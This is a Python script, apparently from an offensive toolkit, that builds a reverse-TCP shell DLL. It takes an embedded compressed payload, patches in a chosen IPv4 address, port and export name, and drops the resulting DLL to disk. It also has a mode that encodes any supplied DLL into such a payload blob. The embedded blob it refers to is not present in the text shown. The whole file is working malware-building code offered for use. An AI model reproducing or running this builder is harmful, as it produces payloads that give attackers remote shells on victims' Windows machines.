import base64
import sys
import struct
import zlib

# This is the structure with IPv4 address and port
# This will be replaced in the payload dll with specified address and port
needle_dest   = b"aaa.bbb.ccc.ddd\0\xff\xff"
needle_export = b"shellshellshell"

# Function to make your own payload blob.
# payload_dll: A dll file with the appropriate "needle" structure
def make_payload(payload_dll):
    print("[+] Making payload... ")
    with open(payload_dll, "rb") as f:
        data = f.read()
    data = base64.b85encode(zlib.compress(data))
    print("[+] Payload:")
    print(data)

def main():
    global payload

    # Big block that just makes sure arguments are correct
    if (len(sys.argv) == 1):
        print("Usage:")
        print(f"  {sys.argv[0]} <ipv4_address> <port> <export_name> <(opt)filename>\n")
        print("\tipv4_address: The destination IPv4 address")
        print("\tport:         The destination TCP port number")
        print("\texport_name:  Name to give your export in the DLL file (limit 15 characters)")
        print(f"  {sys.argv[0]} <payload_dll>")
        print("\tpayload_dll: The DLL file to make an encoded blob out of")
        exit()
    try:
        if (len(sys.argv) == 2):
            make_payload(sys.argv[1])
            exit()
        else:
            addr = sys.argv[1].encode()
            port = int(sys.argv[2])
            export = sys.argv[3].encode()
            filename = f"revtcp_{addr.decode()}_{port}.dll"
            if len(sys.argv) > 4:
                filename = sys.argv[4]

            assert(len(addr) <= 15)
            assert(port > 0 and port < 65536)
            assert(len(export) <= 15)
    except Exception as e:
        print("Error: {}".format(e))
        exit()

    # Find the ipv4 address and port structure to write to
    payload = zlib.decompress(base64.b85decode((payload)))
    offset  = payload.find(needle_dest)

    # Format the data and modify the payload file
    port  = struct.pack("H", port)
    nulls = b'\0'*(len(needle_dest)-len(addr)-2)
    payload = payload[:offset] + addr + nulls + port + payload[offset+len(needle_dest):]

    # Find the export name to write to, format data, and modify payload file
    offset = payload.find(needle_export)
    nulls = b'\0'*(len(needle_export)-len(export))
    payload = payload[:offset] + export + nulls + payload[offset+len(needle_export):]

    # Write the payload to disk    
    with open(filename, "wb") as f:
        f.write(payload)
    print("[+] Dropped {} to disk.".format(filename))

